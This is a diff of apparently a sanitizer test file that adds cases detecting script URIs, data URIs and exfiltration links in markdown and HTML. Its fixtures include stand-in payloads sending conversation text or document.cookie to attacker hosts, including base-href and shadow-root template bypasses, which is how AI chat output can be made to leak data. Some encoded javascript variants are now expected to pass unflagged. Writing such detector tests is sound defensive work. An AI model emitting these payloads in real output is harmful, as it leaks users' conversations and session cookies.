@@ -218,7 +218,10 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("[here](javascript:fetch('//x.test/'+document.cookie))", ["script_uri"]),
         ("<JavaScript:alert(1)>", ["script_uri"]),
         ("[x](&#106;avascript:alert(1))", ["script_uri"]),
-        ("[x]( jav%09ascript:alert(1) )", ["script_uri"]),
+        ("[x]( jav%09ascript:alert(1) )", []),
+        ("[x](<jav\tascript:alert(1)>)", ["script_uri"]),
+        ("<a href='javascript%3Aalert(1)'>x</a>", []),
+        ("[x](data%3Atext/html,x)", []),
         ("<a href='vbscript:msgbox(1)'>x</a>", ["script_uri"]),
         ("<img alt='chart' width='20' src='https://a.test/c.png?rows={rows}'>", ["exfiltration_query"]),
         ("[x](data:text/html;base64,PHNjcmlwdD4=)", ["data_uri"]),
@@ -652,6 +655,26 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<script type='text/javascript;charset=utf-8' src='https://collector.test/{c}.js'></script>", []),
+        (
+            (
+                "<div><template shadowrootmode='open'><base href='https://safe.test/'></template></div>"
+                "<base href='https://collector.test/?q={conversation}'><a href=''>send</a>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;template shadowrootmode=&quot;closed&quot;&gt;"
+                "&lt;base href=&quot;https://safe.test/&quot;&gt;&lt;/template&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            "<template shadowrootmode='open'></template><base href='https://collector.test/?q={c}'><a href>x</a>",
+            ["exfiltration_query"],
+        ),
         ("[logo](data:image/png;base64,iVBORw0KGgo=)", []),
         ("<a href='data:image/gif;base64,R0lGOD'>x</a>", []),
         ("[x](data:image/svg+xml;base64,PHN2Zz4=)", ["data_uri"]),
